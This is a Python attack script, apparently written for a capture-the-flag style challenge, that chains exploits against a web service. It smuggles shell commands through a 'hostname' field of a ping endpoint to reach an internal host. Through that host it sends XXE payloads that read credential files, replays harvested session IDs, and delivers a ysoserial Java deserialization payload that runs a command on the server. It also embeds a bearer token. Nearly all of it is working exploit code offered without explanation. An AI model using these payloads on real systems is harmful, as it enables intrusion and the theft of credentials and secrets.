import requests


token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJzdGlua3lmaXNoIiwibmFtZSI6InN0IW5reSIsImlhdCI6MTU1MTc4MzAwOH0.I97GwWb5eM7Qe0xQtDaKLCtrq4C5aXfHy9RFXuvz40c"
headers = {"Authorization": "Bearer "+token, "accept-encoding":"gzip, deflate, br", "accept-language":"en-US,en;q=0.9,ja-JP;q=0.8,ja;q=0.7,zh-TW;q=0.6,zh;q=0.5", "user-agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36", "accept":"application/json, text/plain, */*", "referer":"https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/foobarcampaign-messages/cncChat.html", "authority":"k7vo268tif.execute-api.us-east-1.amazonaws.com","Content-Type":"application/json"}

#payload
#payload example: XXE get properties
payload_00 = {"hostname":"google.com | curl 'http://ip-172-31-31-95.ec2.internal:8080/commandproc/LoginDocument' -H 'Content-Type: multipart/form-data; boundary=----123' --data-binary '------123\r\nContent-Disposition: form-data; name=\"document\"\r\n\r\n<?xml version=\"1.0\"?><!DOCTYPE svg [ <!ENTITY xxe SYSTEM \"file:////etc/credentials.properties\" >]><credentials><user>admin</user><password>&xxe;</password></credentials>\r\n------123--\r\n' -i -L"}

payload_01 = {"hostname":"google.com | curl 'http://ip-172-31-31-95.ec2.internal:8080/commandproc/login.jsp' -H 'Content-Type: multipart/form-data; boundary=----123' --data-binary '------123\r\nContent-Disposition: form-data; name=\"document\"\r\n\r\n<credentials><user>aaa</user><password>7XIBXvzrWjOq8E5LnkBslZhKjLc+CG3HC5mJaj+Q13ATK0AYvf0ZrhkYVTcbYfFr</password></credentials>\r\n------123--\r\n' -i -L"}
payload_02 = {"hostname":"google.com | curl 'http://ip-172-31-31-95.ec2.internal:8080/commandproc/LoginDocument' -H 'Content-Type: multipart/form-data; boundary=----123' --data-binary '------123\r\nContent-Disposition: form-data; name=\"document\"\r\n\r\n<?xml version=\"1.0\"?><!DOCTYPE svg [ <!ENTITY xxe SYSTEM \"file:////etc/credentials.properties\">]><credentials><user>admin</user><password>7XIBXvzrWjOq8E5LnkBslZhKjLc+CG3HC5mJaj+Q13ATK0AYvf0ZrhkYVTcbYfFr</password></credentials>\r\n------123--\r\n' -i -L"}
payload_03 = {"hostname":"google.com | curl 'http://ip-172-31-31-95.ec2.internal:8080/commandproc/LoginDocument' -H 'Content-Type: multipart/form-data; boundary=----123' -H 'Cookie:JSESSIONID=ZZZZZZZZZZ' --data-binary '------123\r\nContent-Disposition: form-data; name=\"document\"\r\n\r\n<?xml version=\"1.0\"?><!DOCTYPE svg [ <!ENTITY xxe SYSTEM \"file:////etc/credentials.properties\">]><credentials><user>admin</user><password>7XIBXvzrWjOq8E5LnkBslZhKjLc+CG3HC5mJaj+Q13ATK0AYvf0ZrhkYVTcbYfFr</password></credentials>\r\n------123--\r\n' -i -L"}
payload_04 = {"hostname":"google.com | curl 'http://ip-172-31-31-95.ec2.internal:8080/commandproc/login.jsp' -H 'Cookie:JSESSIONID=ZZZZZZZZZZ' -i -L"}
payload_05 = {"hostname":"google.com | curl 'http://ip-172-31-31-95.ec2.internal:8080/commandproc/index.jsp' -H 'Cookie:JSESSIONID=ZZZZZZZZZZ' -i -L"}
payload_06 = {"hostname":"google.com | curl 'http://ip-172-31-31-95.ec2.internal:8080/commandproc/LoginDocument' -H 'Cookie:JSESSIONID=ZZZZZZZZZZ' 'Content-Type: multipart/form-data; boundary=----123' --data-binary '------123\r\nContent-Disposition: form-data; name=\"object\"\r\n\r\n\r\n<?xml version=\"1.0\"?><!DOCTYPE svg [ <!ENTITY xxe SYSTEM \"file:////etc/commandauth.bin\">]><credentials>&xxe;</credentials>\r\n------123--\r\n' -i -L"}
payload_07 = {"hostname":"google.com | curl 'http://ip-172-31-31-95.ec2.internal:8080/commandproc/LoginDocument' -H 'Content-Type: multipart/form-data; boundary=----123' --data-binary '------123\r\nContent-Disposition: form-data; name=\"document\"\r\n\r\n<?xml version=\"1.0\"?><!DOCTYPE svg [ <!ENTITY xxe SYSTEM \"file:////etc/commandauth.bin\" >]><credentials><user>admin</user><password>&xxe;</password></credentials>\r\n------123--\r\n' -i -L"}



#guess
payload_08 = {"hostname":"google.com | curl http://ip-172-31-31-95.ec2.internal:8080/commandproc/GetCommand -H 'Cookie:JSESSIONID=ZZZZZZZZZZ' -F authCode=test -F type=UPLOAD -F target= -F argument="}

yso_payload = "rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAA3NyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAU3QAJnlzb3NlcmlhbC5wYXlsb2Fkcy5Db21tb25zQ29sbGVjdGlvbnM1dAAYQ29tbW9uc0NvbGxlY3Rpb25zNS5qYXZhdAAJZ2V0T2JqZWN0c3EAfgALAAAANXEAfgANcQB+AA5xAH4AD3NxAH4ACwAAACJ0ABl5c29zZXJpYWwuR2VuZXJhdGVQYXlsb2FkdAAUR2VuZXJhdGVQYXlsb2FkLmphdmF0AARtYWluc3IAJmphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVMaXN0/A8lMbXsjhACAAFMAARsaXN0cQB+AAd4cgAsamF2YS51dGlsLkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZUNvbGxlY3Rpb24ZQgCAy173HgIAAUwAAWN0ABZMamF2YS91dGlsL0NvbGxlY3Rpb247eHBzcgATamF2YS51dGlsLkFycmF5TGlzdHiB0h2Zx2GdAwABSQAEc2l6ZXhwAAAAAHcEAAAAAHhxAH4AGnhzcgA0b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmtleXZhbHVlLlRpZWRNYXBFbnRyeYqt0ps5wR/bAgACTAADa2V5cQB+AAFMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAF4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWVxAH4ABVsAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AMgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ADJzcQB+ACt1cQB+AC8AAAACcHVxAH4ALwAAAAB0AAZpbnZva2V1cQB+ADIAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAvc3EAfgArdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQAVG9wZW5zc2wgZW5jIC1hZXMtMjU2LWVjYiAtaW4gL2V0Yy9jb21tYW5kYXV0aC5iaW4gLW91dCAvdG1wL2FhYS5lbmMgLWJhc2U2NCAtayAxMjM0NXQABGV4ZWN1cQB+ADIAAAABcQB+ADdzcQB+ACdzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAeHg="
payload_09 = {"hostname":"google.com | curl -H 'Cookie:JSESSIONID=ZZZZZZZZZZ' 'http://ip-172-31-31-95.ec2.internal:8080/commandproc/SubmitCommand' -H 'Content-Type: multipart/form-data; boundary=----123' --data-binary '------123\r\nContent-Disposition: form-data; name=\"object\"\r\n\r\n"+yso_payload+"\r\n------123--\r\n' -L"}
payload_10 = {"hostname":"google.com | curl 'http://ip-172-31-31-95.ec2.internal:8080/commandproc/LoginDocument' -H 'Content-Type: multipart/form-data; boundary=----123' --data-binary '------123\r\nContent-Disposition: form-data; name=\"document\"\r\n\r\n<?xml version=\"1.0\"?><!DOCTYPE svg [ <!ENTITY xxe SYSTEM \"/tmp/aaa.enc\">]><credentials><user>&xxe;</user><password></password></credentials>\r\n------123--\r\n' -i -L"}

def rockman():
    print("========== payload 01 login ==========")
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_01, headers=headers)
    print(r.status_code)
    print(r.text)

    #print(r.text.find("JSESSIONID="))
    sessionid01 = r.text.split("JSESSIONID=")[1].split(";")[0]
    print(sessionid01)
    print("========== payload 02 ==========")
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_02, headers=headers)
    print(r.status_code)
    print(r.text)

    sessionid02 = r.text.split("JSESSIONID=")[1].split(";")[0]
    print(sessionid02)
    sessionid03 = r.text.split("JSESSIONID=")[2].split(";")[0]
    print(sessionid03)
    sessionid04 = r.text.split("JSESSIONID=")[3].split(";")[0]
    print(sessionid04)

    print("========== payload 03 ==========")
    print(payload_03)
    payload_03["hostname"] = payload_03["hostname"].replace("ZZZZZZZZZZ", sessionid01)
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_03, headers=headers)
    print(r.status_code)
    print(r.text)

    payload_03["hostname"] = payload_03["hostname"].replace("ZZZZZZZZZZ", sessionid02)
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_03, headers=headers)
    print(r.status_code)
    print(r.text)

    payload_03["hostname"] = payload_03["hostname"].replace("ZZZZZZZZZZ", sessionid03)
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_03, headers=headers)
    print(r.status_code)
    print(r.text)

    payload_03["hostname"] = payload_03["hostname"].replace("ZZZZZZZZZZ", sessionid04)
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_03, headers=headers)
    print(r.status_code)
    print(r.text)

    print("========== payload 04 ==========")
    print(payload_04)
    payload_04["hostname"] = payload_04["hostname"].replace("ZZZZZZZZZZ", sessionid01)
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_04, headers=headers)
    print(r.status_code)
    print(r.text)

    payload_04["hostname"] = payload_04["hostname"].replace("ZZZZZZZZZZ", sessionid02)
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_04, headers=headers)
    print(r.status_code)
    print(r.text)

    payload_04["hostname"] = payload_04["hostname"].replace("ZZZZZZZZZZ", sessionid03)
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_04, headers=headers)
    print(r.status_code)
    print(r.text)

    payload_04["hostname"] = payload_04["hostname"].replace("ZZZZZZZZZZ", sessionid04)
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_04, headers=headers)
    print(r.status_code)
    print(r.text)

    print("========== payload 05 ==========")
    print(payload_05)
    payload_05["hostname"] = payload_05["hostname"].replace("ZZZZZZZZZZ", sessionid01)
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_05, headers=headers)
    print(r.status_code)
    print(r.text)

    payload_05["hostname"] = payload_05["hostname"].replace("ZZZZZZZZZZ", sessionid02)
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_05, headers=headers)
    print(r.status_code)
    print(r.text)

    payload_05["hostname"] = payload_05["hostname"].replace("ZZZZZZZZZZ", sessionid03)
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_05, headers=headers)
    print(r.status_code)
    print(r.text)

    payload_05["hostname"] = payload_05["hostname"].replace("ZZZZZZZZZZ", sessionid04)
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_05, headers=headers)
    print(r.status_code)
    print(r.text)

    print("========== payload 06 ==========")
    print(payload_06)
    payload_06["hostname"] = payload_06["hostname"].replace("ZZZZZZZZZZ", sessionid01)
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_06, headers=headers)
    print(r.status_code)
    print(r.text)

    print("========== payload 07 ==========")
    print(payload_07)
    #payload_07["hostname"] = payload_07["hostname"].replace("ZZZZZZZZZZ", sessionid01)
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_07, headers=headers)
    print(r.status_code)
    print(r.text)

    print("========== payload 00 vs 07 ==========")
    print(payload_00)
    #payload_07["hostname"] = payload_07["hostname"].replace("ZZZZZZZZZZ", sessionid01)
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_00, headers=headers)
    print(r.status_code)
    print(r.text)



    print("========== payload 08 ==========")
    print(payload_08)
    payload_08["hostname"] = payload_08["hostname"].replace("ZZZZZZZZZZ", sessionid01)
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_08, headers=headers)
    print(r.status_code)
    print(r.text)

    print("========== payload 09 ==========")
    print(payload_09)
    payload_09["hostname"] = payload_09["hostname"].replace("ZZZZZZZZZZ", sessionid01)
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_09, headers=headers)
    print(r.status_code)
    print(r.text)

    print("========== payload 10 ==========")
    print(payload_10)
    payload_10["hostname"] = payload_10["hostname"].replace("ZZZZZZZZZZ", sessionid01)
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_10, headers=headers)
    print(r.status_code)
    print(r.text)


    htmlwirter(r.text)




def htmlwirter(content):
    open('web.html','w').write(content)


if __name__=="__main__":
    rockman()